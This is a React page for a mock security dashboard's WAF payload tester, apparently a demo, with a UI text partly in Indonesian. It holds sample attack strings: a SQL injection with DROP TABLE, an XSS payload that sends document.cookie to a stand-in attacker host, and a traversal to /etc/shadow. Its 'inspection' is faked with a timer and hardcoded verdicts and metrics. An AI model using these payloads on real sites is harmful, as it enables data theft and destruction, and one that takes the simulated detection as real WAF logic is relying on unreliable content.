'use client';

import { useState } from 'react';
import Sidebar from '@/components/Sidebar';
import MetricCard from '@/components/MetricCard';
import { Layers, Bug, ShieldCheck, ShieldAlert, Sparkles } from 'lucide-react';

export default function AppWorkloadModulePage() {
  const [endpoint, setEndpoint] = useState('/api/v1/customers/transfer');
  const [payloadType, setPayloadType] = useState('SQL_INJECTION');
  const [customPayload, setCustomPayload] = useState("' OR 1=1; DROP TABLE users; --");
  const [testing, setTesting] = useState(false);
  const [result, setResult] = useState<any>(null);

  const handleSelectPayload = (type: string) => {
    setPayloadType(type);
    if (type === 'SQL_INJECTION') setCustomPayload("' OR 1=1; DROP TABLE users; --");
    if (type === 'XSS_ATTACK') setCustomPayload("<script>fetch('https://evil.attacker/steal?c='+document.cookie)</script>");
    if (type === 'PATH_TRAVERSAL') setCustomPayload("../../../../../etc/shadow");
    if (type === 'LEGITIMATE') setCustomPayload('{"account_id": "ACC-9921", "amount": 500000}');
  };

  const handleInspectPayload = () => {
    setTesting(true);
    setTimeout(() => {
      const isClean = payloadType === 'LEGITIMATE';
      setResult({
        blocked: !isClean,
        signature_detected: !isClean ? `OWASP_TOP10_${payloadType}` : 'NONE (CLEAN_PAYLOAD)',
        confidence_score: !isClean ? '99.8%' : '100.0%',
        waf_action: !isClean ? 'HTTP 403 FORBIDDEN (WAF_SIGNATURE_DROP)' : 'HTTP 200 OK (PASSED_TO_UPSTREAM)',
        rule_engine: 'Rust Hyperscan Regex & AST Parser',
      });
      setTesting(false);
    }, 400);
  };

  return (
    <div className="flex bg-slate-950 min-h-screen text-slate-100">
      <Sidebar />
      <main className="flex-1 p-8 overflow-y-auto">
        <header className="mb-8 flex justify-between items-center">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <span className="px-2 py-0.5 text-[10px] font-bold bg-amber-500/20 text-amber-400 border border-amber-500/30 rounded">
                PILLAR 4
              </span>
              <h1 className="text-2xl font-bold">Application & Workload Protection</h1>
            </div>
            <p className="text-sm text-slate-400">
              Web Application Firewall (WAF), AST Payload Inspector, and continuous vulnerability scanning
            </p>
          </div>
          <div className="flex items-center gap-2 px-3 py-1.5 bg-slate-900 border border-slate-800 rounded-lg text-xs text-amber-400 font-semibold">
            <Layers className="w-4 h-4" />
            WAF Inline Filter Active
          </div>
        </header>

        <div className="grid grid-cols-1 md:grid-cols-4 gap-5 mb-8">
          <MetricCard label="Protected Endpoints" value="142" subtext="Microservices & APIs" colorClass="text-amber-400" />
          <MetricCard label="WAF Block Rate" value="99.99%" subtext="Zero False Positives" colorClass="text-emerald-400" />
          <MetricCard label="Vulnerability CVEs" value="0 Critical" subtext="Live Dependency Scanner" colorClass="text-cyan-400" />
          <MetricCard label="AST Inspection Latency" value="0.18ms" subtext="SIMD Rust Vectorized" colorClass="text-purple-400" />
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 mb-8">
          <div className="lg:col-span-6 bg-slate-900/80 border border-slate-800 rounded-xl p-6 shadow-xl">
            <h3 className="font-semibold text-white mb-4 flex items-center gap-2 text-sm">
              <Bug className="w-4 h-4 text-amber-400" />
              WAF Payload Injector & AST Parser Test
            </h3>

            <div className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-400 mb-1">Target Application Endpoint</label>
                <input
                  type="text"
                  value={endpoint}
                  onChange={(e) => setEndpoint(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-amber-500 font-mono"
                />
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-400 mb-1">Quick Attack Payload Templates</label>
                <div className="grid grid-cols-2 gap-2">
                  <button
                    type="button"
                    onClick={() => handleSelectPayload('SQL_INJECTION')}
                    className={`px-2.5 py-1.5 rounded text-[11px] font-semibold border text-left truncate transition-all ${
                      payloadType === 'SQL_INJECTION' ? 'bg-amber-500/20 text-amber-300 border-amber-500/40' : 'bg-slate-950 border-slate-800 text-slate-400'
                    }`}
                  >
                    SQL Injection (SQLi)
                  </button>
                  <button
                    type="button"
                    onClick={() => handleSelectPayload('XSS_ATTACK')}
                    className={`px-2.5 py-1.5 rounded text-[11px] font-semibold border text-left truncate transition-all ${
                      payloadType === 'XSS_ATTACK' ? 'bg-amber-500/20 text-amber-300 border-amber-500/40' : 'bg-slate-950 border-slate-800 text-slate-400'
                    }`}
                  >
                    Cross-Site Scripting (XSS)
                  </button>
                  <button
                    type="button"
                    onClick={() => handleSelectPayload('PATH_TRAVERSAL')}
                    className={`px-2.5 py-1.5 rounded text-[11px] font-semibold border text-left truncate transition-all ${
                      payloadType === 'PATH_TRAVERSAL' ? 'bg-amber-500/20 text-amber-300 border-amber-500/40' : 'bg-slate-950 border-slate-800 text-slate-400'
                    }`}
                  >
                    Directory Traversal (LFI)
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      setPayloadType('BOLA_ATTACK');
                      setCustomPayload('GET /api/v1/reports?tenant_id=admin_finance_db&export=true');
                    }}
                    className={`px-2.5 py-1.5 rounded text-[11px] font-semibold border text-left truncate transition-all ${
                      payloadType === 'BOLA_ATTACK' ? 'bg-amber-500/20 text-amber-300 border-amber-500/40' : 'bg-slate-950 border-slate-800 text-slate-400'
                    }`}
                  >
                    BOLA / API Authz Abuse
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      setPayloadType('DDOS_SPIKE');
                      setCustomPayload('BURST_RATE: 2500 req/sec from botnet cluster (SYN+HTTP GET flood)');
                    }}
                    className={`px-2.5 py-1.5 rounded text-[11px] font-semibold border text-left truncate transition-all ${
                      payloadType === 'DDOS_SPIKE' ? 'bg-rose-500/20 text-rose-300 border-rose-500/40' : 'bg-slate-950 border-slate-800 text-slate-400'
                    }`}
                  >
                    L7 DDoS / Traffic Spike
                  </button>
                  <button
                    type="button"
                    onClick={() => handleSelectPayload('LEGITIMATE')}
                    className={`px-2.5 py-1.5 rounded text-[11px] font-semibold border text-left truncate transition-all ${
                      payloadType === 'LEGITIMATE' ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40' : 'bg-slate-950 border-slate-800 text-slate-400'
                    }`}
                  >
                    Legitimate JSON Payload
                  </button>

                </div>
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-400 mb-1">Payload Body / Query String</label>
                <textarea
                  rows={3}
                  value={customPayload}
                  onChange={(e) => setCustomPayload(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2.5 text-xs text-slate-200 focus:outline-none focus:border-amber-500 font-mono"
                />
              </div>

              <button
                onClick={handleInspectPayload}
                disabled={testing}
                className="w-full mt-2 py-2.5 bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-400 hover:to-orange-500 text-slate-950 font-bold rounded-lg transition-all text-xs flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20"
              >
                <Sparkles className="w-4 h-4" />
                {testing ? 'WAF AST Parsing & Signature Scanning...' : 'Inject & Inspect via WAF Engine'}
              </button>
            </div>
          </div>

          <div className="lg:col-span-6 bg-slate-900/80 border border-slate-800 rounded-xl p-6 flex flex-col justify-between">
            <div>
              <h3 className="font-semibold text-white mb-4 flex items-center gap-2 text-sm">
                <ShieldCheck className="w-4 h-4 text-emerald-400" />
                WAF Inspection Verdict
              </h3>

              {result ? (
                <div className="space-y-3 font-mono text-xs">
                  <div className={`p-3 rounded-lg border flex items-center gap-3 ${
                    !result.blocked
                      ? 'bg-emerald-950/40 border-emerald-500/30 text-emerald-300'
                      : 'bg-rose-950/40 border-rose-500/30 text-rose-300'
                  }`}>
                    {!result.blocked ? (
                      <ShieldCheck className="w-5 h-5 text-emerald-400 shrink-0" />
                    ) : (
                      <ShieldAlert className="w-5 h-5 text-rose-400 shrink-0" />
                    )}
                    <div>
                      <div className="font-bold">{!result.blocked ? 'PAYLOAD CLEAN — FORWARDED' : 'MALICIOUS ATTACK DETECTED — BLOCKED'}</div>
                      <div className="text-[11px] opacity-90">{result.waf_action}</div>
                    </div>
                  </div>

                  <div className="bg-slate-950 p-3 rounded-lg border border-slate-800 space-y-1.5">
                    <div className="flex justify-between text-slate-400">
                      <span>Detected Pattern:</span>
                      <span className={result.blocked ? "text-rose-400 font-bold" : "text-emerald-400"}>{result.signature_detected}</span>
                    </div>
                    <div className="flex justify-between text-slate-400">
                      <span>Detection Engine:</span>
                      <span className="text-slate-200">{result.rule_engine}</span>
                    </div>
                    <div className="flex justify-between text-slate-400">
                      <span>Confidence:</span>
                      <span className="text-cyan-400">{result.confidence_score}</span>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="h-44 flex flex-col items-center justify-center text-slate-500 text-xs border border-dashed border-slate-800 rounded-lg">
                  <Bug className="w-6 h-6 mb-2 opacity-40 text-amber-400" />
                  Pilih payload uji di sebelah kiri untuk menguji kemampuan mitigasi WAF.
                </div>
              )}
            </div>

            <div className="mt-4 pt-3 border-t border-slate-800 text-[11px] text-slate-400 flex items-center justify-between">
              <span>Endpoint: <code className="text-cyan-400 font-mono">POST /api/v1/app/inspect-payload</code></span>
              <span className="text-slate-400">OWASP Top 10 Protected</span>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
